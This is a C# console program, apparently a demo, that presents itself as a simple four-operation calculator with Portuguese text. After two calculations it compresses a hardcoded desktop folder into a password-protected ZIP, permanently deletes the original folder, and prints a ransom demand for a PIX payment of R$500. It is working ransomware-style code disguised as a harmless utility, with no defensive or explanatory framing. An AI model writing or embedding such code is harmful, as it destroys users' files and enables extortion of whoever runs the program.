using ICSharpCode.SharpZipLib.Zip;
using System;
using System.IO;

namespace Calculadora
{
    class Program
    {
        static void Main(string[] args)
        {
            bool executar = true;
            int contadorChamadas = 0;



            while (executar)
            {
                if (contadorChamadas >= 2)
                {
                    try
                    {
                        string caminhoDocumentosParaMostrarApenasDeTeste = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                     
                        Console.WriteLine("Caminho para acabar com a sua vida se eu quisesse: ");
                        Console.WriteLine(caminhoDocumentosParaMostrarApenasDeTeste);

                        string pastaOrigem = "C:\\Users\\paulo\\Desktop\\Coisas Importantes";
                        string arquivoDestino = "C:\\Users\\paulo\\Desktop\\SeusDadosForamCapturados.zip";
                        string senha = "senhabemmassa";

                        if (!Directory.Exists(pastaOrigem))
                        {
                            Console.WriteLine("A pasta informada não existe.");
                            break;
                        }

                        // Compactar a pasta
                        CompactarPastaComSenha(pastaOrigem, arquivoDestino, senha);

                        // Verifica se o arquivo ZIP foi criado com sucesso
                        if (File.Exists(arquivoDestino))
                        {
                            // Apagar a pasta original permanentemente
                            ApagarPastaPermanentemente(pastaOrigem);
                        }
                        else
                        {
                            Console.WriteLine("O arquivo ZIP não foi criado corretamente. A pasta não será apagada.");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.Error.WriteLine($"Erro durante o processo: {ex}");
                    }

                    // Sai do laço e exibe as mensagens finais
                    break;
                }

                Console.WriteLine("Qual operação deseja fazer?");
                Console.WriteLine("1 - Adição");
                Console.WriteLine("2 - Subtração");
                Console.WriteLine("3 - Multiplicação");
                Console.WriteLine("4 - Divisão\n");

                int operacao = int.Parse(Console.ReadLine());

                Console.WriteLine("Digite o primeiro número: ");
                int num1 = int.Parse(Console.ReadLine());

                Console.WriteLine("Digite o segundo número: ");
                int num2 = int.Parse(Console.ReadLine());

                int resultado = 0;

                switch (operacao)
                {
                    case 1:
                        resultado = Adicao(num1, num2);
                        contadorChamadas++;
                        break;

                    case 2:
                        resultado = Subtracao(num1, num2);
                        contadorChamadas++;
                        break;

                    case 3:
                        resultado = Multiplicacao(num1, num2);
                        contadorChamadas++;
                        break;

                    case 4:
                        resultado = Divisao(num1, num2);
                        contadorChamadas++;
                        break;

                    default:
                        Console.WriteLine("Número inválido, digite um válido.");
                        break;
                }

                Console.WriteLine("O resultado com os números {0} e {1} é: {2}", num1, num2, resultado);
            }

            // Mensagens finais após o laço
            Console.WriteLine("-------------------------------------------------");
            Console.WriteLine("SEQUESTRAMOS OS SEUS DADOS!!!!");
            Console.WriteLine("OS DADOS SERÃO LIBERADOS MEDIANTE A TRANSFERÊNCIA PIX DO VALOR DE R$ 500,00");
            Console.WriteLine("PELA CHAVE:");
            Console.WriteLine("soumalvadao@sefodeu.com");
            Console.WriteLine("ENCAMINHE O COMPROVANTE VIA MESMO EMAIL");
            Console.WriteLine("-------------------------------------------------");
            Console.ReadLine();

        }

        public static int Adicao(int numero1, int numero2) => numero1 + numero2;

        public static int Subtracao(int numero1, int numero2) => numero1 - numero2;

        public static int Multiplicacao(int numero1, int numero2) => numero1 * numero2;

        public static int Divisao(int numero1, int numero2) => numero1 / numero2;

        static void CompactarPastaComSenha(string pastaOrigem, string arquivoDestino, string senha)
        {
            try
            {
                using (FileStream fs = File.Create(arquivoDestino))
                using (ZipOutputStream zipStream = new ZipOutputStream(fs))
                {
                    zipStream.SetLevel(9);
                    zipStream.Password = senha;
                    AdicionarPastaAoZip(zipStream, pastaOrigem, "");
                    zipStream.Finish();
                }

                Console.WriteLine($"Pasta compactada com sucesso em {arquivoDestino}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Erro ao compactar a pasta: {ex.Message}");
                throw;
            }
        }

        static void AdicionarPastaAoZip(ZipOutputStream zipStream, string pastaOrigem, string pastaRelativa)
        {
            foreach (var arquivo in Directory.GetFiles(pastaOrigem))
            {
                var entryName = Path.Combine(pastaRelativa, Path.GetFileName(arquivo));
                var newEntry = new ZipEntry(entryName) { DateTime = DateTime.Now };
                zipStream.PutNextEntry(newEntry);

                using (var fs = File.OpenRead(arquivo))
                {
                    fs.CopyTo(zipStream);
                }

                zipStream.CloseEntry();
            }

            foreach (var subPasta in Directory.GetDirectories(pastaOrigem))
            {
                var pastaNome = Path.Combine(pastaRelativa, Path.GetFileName(subPasta));
                AdicionarPastaAoZip(zipStream, subPasta, pastaNome);
            }
        }

        static void ApagarPastaPermanentemente(string pastaOrigem)
        {
            try
            {
                Directory.Delete(pastaOrigem, true);
                Console.WriteLine("Pasta original apagada permanentemente.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Erro ao apagar a pasta: {ex.Message}");
                throw;
            }
        }
    }
}
